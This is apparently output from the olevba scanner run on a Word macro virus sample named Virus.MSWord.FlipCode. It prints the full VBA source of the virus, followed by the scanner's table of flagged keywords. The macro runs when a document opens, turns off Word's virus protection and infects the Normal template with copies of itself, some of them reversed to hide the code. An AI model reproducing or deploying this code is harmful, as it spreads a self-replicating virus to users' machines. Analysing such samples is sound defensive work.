olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.FlipCode
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.FlipCode - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open() ' buS dnE :lacitirCbv ,".yltcerroc ti llatsni ot putes nur esaelP .dezilaitini eb ton dluoc tnemnorivne cisaB lausiV ehT" xoBgsM :)(edocbvweiv buS etavirP
Application.ShowVisualBasicEditor = False ' buS dnE
On Error GoTo yalav ' emaNlluF.tnemucoDevitcA=:emaNeliF sAevaS.tnemucoDevitcA nehT "tnemucoD" >< )8 ,emaN.tnemucoDevitcA(tfeL fI
Options.VirusProtection = 0 ' gal txeN
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines ' $van ,1 seniLtresnI.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA
For lav = 1 To 14 ' tanya txeN
ehs$ = "" ' )1 ,tanya ,))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(($diM & $van = $van
For ruam = 1 To Len(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(lav, 1)) ' 1- petS 1 oT ))1 ,gal(senil.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.etalpmeTlamroN(neL = tanya roF
ehs$ = Mid$((ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(lav, 1)), ruam, 1) & ehs$ ' "" = $van
Next ruam ' 41 oT 1 = gal roF
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ehs$ ' seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA ,1 seniLeteleD.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA nehT 0 > seniLfOtnuoC.eludoMedoC.)1(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA fI
Next lav ' eslaF = noitcetorPsuriV.snoitpO
'9991 eam 0.1v edocpilf' txeN emuseR rorrE nO
yalav: End Sub ' )(esolc_tnemucod buS etavirP
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

